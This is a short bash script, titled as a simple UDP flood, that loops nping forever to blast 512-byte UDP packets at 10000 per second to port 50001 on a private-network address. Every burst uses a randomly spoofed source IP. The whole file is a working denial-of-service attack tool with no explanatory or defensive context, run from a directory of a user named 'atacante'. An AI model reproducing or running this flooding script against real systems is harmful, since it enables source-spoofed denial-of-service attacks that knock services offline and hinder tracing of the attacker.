#!/bin/bash

# chmod +x simple_udp_flood.sh

while true; do
  sudo ./home/atacante/nmap/nping --udp -p 50001 -S $((RANDOM%223+2)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)) \
    --data-length 512 --rate 10000 --dest-ip 192.168.100.2 --no-capture -H -c 10
done
